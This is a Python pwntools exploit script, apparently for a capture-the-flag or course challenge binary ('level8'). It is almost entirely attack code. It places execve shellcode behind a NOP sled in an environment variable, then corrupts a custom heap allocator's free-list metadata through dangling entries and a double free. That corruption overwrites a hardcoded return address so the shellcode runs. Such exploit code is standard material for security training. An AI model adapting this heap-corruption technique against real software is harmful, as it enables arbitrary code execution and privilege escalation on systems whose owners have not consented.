#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./8AAAAAAA
from pwn import *

# Set up pwntools for the correct architecture
# exe = context.binary = ELF(args.EXE or './8AAAAAAA')
exe = context.binary = ELF(args.EXE or '/var/challenge/level8/8')

jumper = asm('jmp short $+20')  # jump over the 8 bytes that are being set by free_list_remove
l33tpath = '/usr/local/bin/l33t'
shellcode = asm(shellcraft.execve(path=l33tpath, argv=[l33tpath]))
nop_sled = b'\x90' * 200
shellcode = nop_sled + shellcode
shellcode = shellcode[:68] + jumper + shellcode[68 + len(jumper):]

# Start with a custom empty env
env = {
    "SHOULD_NOT_SEE": "yes",
    "L33T": "A" * len(shellcode), # when run with GDB, bytes give an error so replace with a string of the same length to reproduce env
}

shellcode_addr = (0x7fffffffeec8 + 50) # + 50 to jump over the "L33T=" part of the env variable
shellcode_addr_packed = p64(shellcode_addr)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw, env=env)
    else:
        env["L33T"] = shellcode
        return process([exe.path] + argv, *a, **kw, env=env)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX unknown - GNU_STACK missing
# PIE:        No PIE (0x400000)
# Stack:      Executable
# RWX:        Has RWX segments
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No
# Debuginfo:  Yes

ENTRY_FLAG_LAST = 1

io = start()

# alloc 6 * 40 bytes
io.sendline(b"s a=" + 38 * b"A")
io.sendline(b"s b=" + 38 * b"B")
io.sendline(b"s c=" + 38 * b"C")
io.sendline(b"s d=" + 38 * b"D") # mem barrier, avoid merging with the large free block 

return_addr = 0x7fffffffe938

# metadata information for the second block (only prev and next matter)
b2_size = p64(0)
b2_free_prev = p64(return_addr - 16) #8*0x99.to_bytes(1, 'little')  
b2_free_next = p64(shellcode_addr) #8*0x88.to_bytes(1, 'little')
b2_block_prev = p64(0)

io.sendline(b"s e=" + 6 * b"E" + b2_size + b2_free_prev + b2_free_next + b2_block_prev)

# free b and c by allocating larger buffers (this keeps pairs[1] and pairs[2].data dangling)
io.sendline(b"s b=" + 200 * b"b")
io.sendline(b"s c=" + 200 * b"c")

return_addr = 0x7fffffffe918 # found with GDB

# metadata information for the first block (only size matters)
b1_size = p64((200) & ~ENTRY_FLAG_LAST)
b1_free_prev = p64(0)
b1_free_next = p64(0)
b1_block_prev = p64(0)

# the free_first now points to pairs[1]. so if we malloc exactly the space of old b + sizeof entry + old c, then we can overwrite the metadata that pairs[2] uses
io.sendline(b"s x=" + 46 * b"X" + b1_size + b1_free_prev + b1_free_next + b1_block_prev + b"y=" + 38 * b"Y")

# trigger a double free by setting a larger value for y (at pairs[2])
# merge using our overwritten metadata
io.sendline(b"s y=" + 200 * b"Y")

io.interactive()

    

